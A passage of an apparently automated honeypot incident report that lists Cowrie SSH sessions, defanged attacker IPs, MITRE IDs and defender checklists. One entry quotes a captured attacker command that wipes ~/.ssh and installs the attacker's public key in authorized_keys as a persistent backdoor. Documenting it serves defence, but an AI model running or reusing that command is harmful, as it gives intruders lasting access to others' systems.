| `2026-08-29 21:34:02` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.108.144[.]34` to AbuseIPDB if not already reported
- [ ] Block `113.108.144[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62b9f5a9489b

| Field | Detail |
|---|---|
| **Source IP** | `186.238.242[.]194` |
| **First Seen** | 2026-08-29 21:34 |
| **Last Seen** | 2026-08-29 21:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:34:07` | `cowrie.session.connect` |
| `2026-08-29 21:34:08` | `cowrie.client.version` |
| `2026-08-29 21:34:08` | `cowrie.client.kex` |
| `2026-08-29 21:34:09` | `cowrie.login.success` |
| `2026-08-29 21:34:10` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.238.242[.]194` to AbuseIPDB if not already reported
- [ ] Block `186.238.242[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b29ba7a51b6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:37 |
| **Last Seen** | 2026-08-29 21:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:37:39` | `cowrie.session.connect` |
| `2026-08-29 21:37:39` | `cowrie.client.version` |
| `2026-08-29 21:37:39` | `cowrie.client.kex` |
| `2026-08-29 21:37:40` | `cowrie.login.success` |
| `2026-08-29 21:37:40` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:37:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:37:40` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69bedca7d228

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-08-29 21:38 |
| **Last Seen** | 2026-08-29 21:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:38:45` | `cowrie.session.connect` |
| `2026-08-29 21:38:45` | `cowrie.client.version` |
| `2026-08-29 21:38:45` | `cowrie.client.kex` |
| `2026-08-29 21:38:47` | `cowrie.login.success` |
| `2026-08-29 21:38:48` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-158b166a6a64

| Field | Detail |
|---|---|
| **Source IP** | `125.36.68[.]227` |
| **First Seen** | 2026-08-29 21:38 |
| **Last Seen** | 2026-08-29 21:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:38:53` | `cowrie.session.connect` |
| `2026-08-29 21:38:53` | `cowrie.client.version` |
| `2026-08-29 21:38:53` | `cowrie.client.kex` |
| `2026-08-29 21:38:56` | `cowrie.login.success` |
| `2026-08-29 21:38:57` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.36.68[.]227` to AbuseIPDB if not already reported
- [ ] Block `125.36.68[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a52d0a17f0a6

| Field | Detail |
|---|---|
| **Source IP** | `36.89.252[.]58` |
| **First Seen** | 2026-08-29 21:40 |
| **Last Seen** | 2026-08-29 21:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:40:52` | `cowrie.session.connect` |
| `2026-08-29 21:40:53` | `cowrie.client.version` |
| `2026-08-29 21:40:53` | `cowrie.client.kex` |
| `2026-08-29 21:40:54` | `cowrie.login.failed` |
| `2026-08-29 21:40:55` | `cowrie.login.success` |
| `2026-08-29 21:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.89.252[.]58` to AbuseIPDB if not already reported
- [ ] Block `36.89.252[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00404545652c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-29 21:41 |
| **Last Seen** | 2026-08-29 21:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:41:01` | `cowrie.session.connect` |
| `2026-08-29 21:41:01` | `cowrie.client.version` |
| `2026-08-29 21:41:01` | `cowrie.client.kex` |
| `2026-08-29 21:41:01` | `cowrie.login.success` |
| `2026-08-29 21:41:01` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:41:02` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:41:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7439a9645151

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:42 |
| **Last Seen** | 2026-08-29 21:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:42:03` | `cowrie.session.connect` |
| `2026-08-29 21:42:03` | `cowrie.client.version` |
| `2026-08-29 21:42:03` | `cowrie.client.kex` |
| `2026-08-29 21:42:04` | `cowrie.login.success` |
| `2026-08-29 21:42:04` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:42:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:42:04` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:42:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5744f0ee612f

| Field | Detail |
|---|---|
| **Source IP** | `118.183.180[.]108` |
| **First Seen** | 2026-08-29 21:48 |
| **Last Seen** | 2026-08-29 21:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:48:02` | `cowrie.session.connect` |
| `2026-08-29 21:48:03` | `cowrie.client.version` |
| `2026-08-29 21:48:03` | `cowrie.client.kex` |
| `2026-08-29 21:48:04` | `cowrie.login.success` |
| `2026-08-29 21:48:05` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:48:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.183.180[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.183.180[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a6aba614d71

| Field | Detail |
|---|---|
| **Source IP** | `112.25.140[.]211` |
| **First Seen** | 2026-08-29 21:48 |
| **Last Seen** | 2026-08-29 21:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:48:10` | `cowrie.session.connect` |
| `2026-08-29 21:48:11` | `cowrie.client.version` |
| `2026-08-29 21:48:11` | `cowrie.client.kex` |
| `2026-08-29 21:48:13` | `cowrie.login.success` |
| `2026-08-29 21:48:13` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.25.140[.]211` to AbuseIPDB if not already reported
- [ ] Block `112.25.140[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf47178fb0ee

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:48 |
| **Last Seen** | 2026-08-29 21:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:48:14` | `cowrie.session.connect` |
| `2026-08-29 21:48:14` | `cowrie.client.version` |
| `2026-08-29 21:48:14` | `cowrie.client.kex` |
| `2026-08-29 21:48:15` | `cowrie.login.success` |
| `2026-08-29 21:48:15` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:48:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:48:15` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f8f9b16012f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:51 |
| **Last Seen** | 2026-08-29 21:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:51:28` | `cowrie.session.connect` |
| `2026-08-29 21:51:28` | `cowrie.client.version` |
| `2026-08-29 21:51:28` | `cowrie.client.kex` |
| `2026-08-29 21:51:29` | `cowrie.login.success` |
| `2026-08-29 21:51:29` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:51:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:51:29` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fefd71f44593

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:59 |
| **Last Seen** | 2026-08-29 21:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:59:02` | `cowrie.session.connect` |
| `2026-08-29 21:59:03` | `cowrie.client.version` |
| `2026-08-29 21:59:03` | `cowrie.client.kex` |
| `2026-08-29 21:59:04` | `cowrie.login.success` |
| `2026-08-29 21:59:06` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:59:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:59:06` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7e8b92dc4a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 22:01 |
| **Last Seen** | 2026-08-29 22:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:01:14` | `cowrie.session.connect` |
| `2026-08-29 22:01:14` | `cowrie.client.version` |
| `2026-08-29 22:01:14` | `cowrie.client.kex` |
| `2026-08-29 22:01:16` | `cowrie.login.success` |
| `2026-08-29 22:01:16` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:01:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 22:01:17` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cb80b8149da

| Field | Detail |
|---|---|
| **Source IP** | `202.154.15[.]177` |
| **First Seen** | 2026-08-29 22:03 |
| **Last Seen** | 2026-08-29 22:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:03:18` | `cowrie.session.connect` |
| `2026-08-29 22:03:19` | `cowrie.client.version` |
| `2026-08-29 22:03:19` | `cowrie.client.kex` |
| `2026-08-29 22:03:22` | `cowrie.login.success` |
| `2026-08-29 22:03:22` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:03:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.154.15[.]177` to AbuseIPDB if not already reported
- [ ] Block `202.154.15[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d312d2fa947

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-08-29 22:05 |
| **Last Seen** | 2026-08-29 22:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:05:38` | `cowrie.session.connect` |
| `2026-08-29 22:05:39` | `cowrie.client.version` |
| `2026-08-29 22:05:39` | `cowrie.client.kex` |
| `2026-08-29 22:05:41` | `cowrie.login.success` |
| `2026-08-29 22:05:41` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb7861d0a7be

| Field | Detail |
|---|---|
| **Source IP** | `211.107.130[.]203` |
| **First Seen** | 2026-08-29 22:05 |
| **Last Seen** | 2026-08-29 22:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:05:44` | `cowrie.session.connect` |
| `2026-08-29 22:05:45` | `cowrie.client.version` |
| `2026-08-29 22:05:45` | `cowrie.client.kex` |
| `2026-08-29 22:05:47` | `cowrie.login.success` |
| `2026-08-29 22:05:48` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.107.130[.]203` to AbuseIPDB if not already reported
- [ ] Block `211.107.130[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab15b6dfbd5d

| Field | Detail |
|---|---|
| **Source IP** | `64.53.7[.]231` |
| **First Seen** | 2026-08-29 22:05 |
| **Last Seen** | 2026-08-29 22:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:05:45` | `cowrie.session.connect` |
| `2026-08-29 22:05:46` | `cowrie.client.version` |
| `2026-08-29 22:05:46` | `cowrie.client.kex` |
| `2026-08-29 22:05:48` | `cowrie.login.success` |
| `2026-08-29 22:05:49` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.53.7[.]231` to AbuseIPDB if not already reported
- [ ] Block `64.53.7[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d36654097687

| Field | Detail |
|---|---|
| **Source IP** | `103.7.60[.]253` |
| **First Seen** | 2026-08-29 22:05 |
| **Last Seen** | 2026-08-29 22:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:05:47` | `cowrie.session.connect` |
| `2026-08-29 22:05:47` | `cowrie.client.version` |
| `2026-08-29 22:05:47` | `cowrie.client.kex` |
| `2026-08-29 22:05:48` | `cowrie.login.success` |
| `2026-08-29 22:05:49` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.7.60[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.7.60[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-652661560817

| Field | Detail |
|---|---|
| **Source IP** | `186.238.89[.]142` |
| **First Seen** | 2026-08-29 22:05 |
| **Last Seen** | 2026-08-29 22:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:05:53` | `cowrie.session.connect` |
| `2026-08-29 22:05:54` | `cowrie.client.version` |
| `2026-08-29 22:05:54` | `cowrie.client.kex` |
| `2026-08-29 22:05:55` | `cowrie.login.success` |
| `2026-08-29 22:05:56` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.238.89[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.238.89[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26ddcab7c9c8

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]74` |
| **First Seen** | 2026-08-29 22:07 |
| **Last Seen** | 2026-08-29 22:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:07:44` | `cowrie.session.connect` |
| `2026-08-29 22:07:44` | `cowrie.client.version` |
| `2026-08-29 22:07:44` | `cowrie.client.kex` |
| `2026-08-29 22:07:44` | `cowrie.login.success` |
| `2026-08-29 22:07:45` | `cowrie.session.params` |
| `2026-08-29 22:07:45` | `cowrie.command.input` |
| `2026-08-29 22:07:45` | `cowrie.command.failed` |
| `2026-08-29 22:07:45` | `cowrie.log.closed` |
| `2026-08-29 22:07:46` | `cowrie.session.params` |
| `2026-08-29 22:07:46` | `cowrie.command.input` |
| `2026-08-29 22:07:46` | `cowrie.session.file_download` |
| `2026-08-29 22:07:46` | `cowrie.log.closed` |
| `2026-08-29 22:07:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]74` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f6744bdd79d

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]74` |
| **First Seen** | 2026-08-29 22:07 |
| **Last Seen** | 2026-08-29 22:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:07:46` | `cowrie.session.connect` |
| `2026-08-29 22:07:46` | `cowrie.client.version` |
| `2026-08-29 22:07:46` | `cowrie.client.kex` |
| `2026-08-29 22:07:47` | `cowrie.login.success` |
| `2026-08-29 22:07:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]74` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aff889d506b

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]74` |
| **First Seen** | 2026-08-29 22:07 |
| **Last Seen** | 2026-08-29 22:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:07:47` | `cowrie.session.connect` |
| `2026-08-29 22:07:47` | `cowrie.client.version` |
| `2026-08-29 22:07:47` | `cowrie.client.kex` |
| `2026-08-29 22:07:48` | `cowrie.login.success` |
| `2026-08-29 22:07:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]74` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565118049d74

| Field | Detail |
|---|---|
| **Source IP** | `188.166.239[.]236` |
| **First Seen** | 2026-08-29 22:08 |
| **Last Seen** | 2026-08-29 22:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:08:34` | `cowrie.session.connect` |
| `2026-08-29 22:08:34` | `cowrie.client.version` |
| `2026-08-29 22:08:34` | `cowrie.client.kex` |
| `2026-08-29 22:08:35` | `cowrie.login.success` |
| `2026-08-29 22:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.166.239[.]236` to AbuseIPDB if not already reported
- [ ] Block `188.166.239[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f2ec8a2b73

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-29 22:08 |
| **Last Seen** | 2026-08-29 22:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
